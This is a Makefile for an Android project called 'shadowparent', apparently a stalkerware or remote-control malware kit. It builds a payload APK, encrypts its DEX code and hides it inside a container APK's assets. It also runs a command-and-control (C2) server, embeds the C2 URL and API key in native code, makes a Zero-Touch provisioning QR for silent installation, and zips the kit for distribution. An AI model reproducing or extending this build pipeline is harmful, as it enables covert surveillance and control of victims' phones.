# shadowparent/Makefile
SHELL := /bin/bash
.ONESHELL:
.DEFAULT_GOAL := help

ANDROID_DIR := android
PAYLOAD_DIR := payload
C2_DIR := c2
BUILD_DIR := build
APK_OUT := $(BUILD_DIR)/android_UI.apk
PAYLOAD_APK := $(BUILD_DIR)/payload.apk
PAYLOAD_ENC := $(ANDROID_DIR)/app/src/main/assets/payload.dex.enc
ZIP_OUT := $(BUILD_DIR)/android_UI-full.zip

.PHONY: help
help:
	@echo "targets:"
	@echo "  make deps       — install python deps"
	@echo "  make keystore   — generate release keystore"
	@echo "  make payload    — build payload APK + encrypt DEX"
	@echo "  make apk        — build container APK"
	@echo "  make c2         — start C2 (docker)"
	@echo "  make serve      — run C2 locally (gunicorn, same cmd as Render)"
	@echo "  make config     — regenerate native C2 config (C2_URL=... API_KEY=...)"
	@echo "  make qr         — generate Zero-Touch provisioning QR"
	@echo "  make zip        — package everything"
	@echo "  make wrapper    — regenerate the Gradle wrapper"
	@echo "  make check      — Kotlin compile check (no NDK needed)"
	@echo "  make all        — keystore + payload + apk + zip"
	@echo "  make clean      — remove build/"

.PHONY: deps
deps:
	pip3 install -r $(C2_DIR)/requirements.txt
	pip3 install cryptography qrcode pillow

.PHONY: keystore
keystore:
	bash wizard/gen_keystore.sh

.PHONY: payload
payload:
	cd $(ANDROID_DIR) && ./gradlew :payload:assembleRelease
	mkdir -p $(BUILD_DIR)
	cp $(PAYLOAD_DIR)/build/outputs/apk/release/payload-release.apk $(PAYLOAD_APK)
	# Распаковываем classes.dex из payload APK и шифруем
	mkdir -p $(BUILD_DIR)/payload_extract
	cd $(BUILD_DIR)/payload_extract && unzip -o ../payload.apk classes.dex
	python3 tools/encrypt_payload.py \
	    $(BUILD_DIR)/payload_extract/classes.dex \
	    $(PAYLOAD_ENC)
	@echo "[+] payload DEX encrypted → $(PAYLOAD_ENC)"

.PHONY: apk
apk:
	cd $(ANDROID_DIR) && ./gradlew :app:assembleRelease
	mkdir -p $(BUILD_DIR)
	cp $(ANDROID_DIR)/app/build/outputs/apk/release/app-release.apk $(APK_OUT)
	@echo "[+] APK → $(APK_OUT)"

.PHONY: c2
c2:
	cd $(C2_DIR) && docker compose up -d --build

.PHONY: serve
serve:
	@echo "[+] C2 on http://0.0.0.0:8000"
	cd $(C2_DIR) && PORT=8000 gunicorn --chdir . --bind 0.0.0.0:$$PORT --workers 1 app:app

.PHONY: config
config:
	@test -n "$(C2_URL)" || (echo "usage: make config C2_URL=https://... API_KEY=sk-..."; exit 1)
	python3 tools/gen_c2_config.py "$(C2_URL)" "$(API_KEY)" --write
	@echo "[+] native C2 config updated → android/app/src/main/cpp/native-lib.cpp"

.PHONY: qr
qr:
	python3 wizard/zero-touch-qr.py --apk-url "$(APK_URL)" --wifi-ssid "$(WIFI_SSID)" \
		--wifi-pass "$(WIFI_PASS)" --out build/provision-qr.png

.PHONY: zip
zip:
	mkdir -p $(BUILD_DIR)/pkg
	cp -r $(ANDROID_DIR) $(BUILD_DIR)/pkg/
	cp -r $(PAYLOAD_DIR) $(BUILD_DIR)/pkg/
	cp -r $(C2_DIR) $(BUILD_DIR)/pkg/
	cp -r wizard $(BUILD_DIR)/pkg/
	cp -r tools $(BUILD_DIR)/pkg/
	cp Makefile .env.example README.md $(BUILD_DIR)/pkg/
	cp $(APK_OUT) $(PAYLOAD_APK) $(BUILD_DIR)/pkg/
	cd $(BUILD_DIR)/pkg && zip -r ../android_UI-full.zip .
	@echo "[+] ZIP → $(ZIP_OUT)"

.PHONY: all
all: keystore payload apk zip
	@echo "[✓] full package ready: $(ZIP_OUT)"

.PHONY: wrapper
wrapper:
	cd $(ANDROID_DIR) && ./gradlew wrapper --gradle-version 8.10.2 --distribution-type bin

.PHONY: check
check:
	cd $(ANDROID_DIR) && ./gradlew -PspNoNative=true :app:compileDebugKotlin :payload:compileDebugKotlin

.PHONY: clean
clean:
	rm -rf $(BUILD_DIR)
	cd $(ANDROID_DIR) && ./gradlew clean || true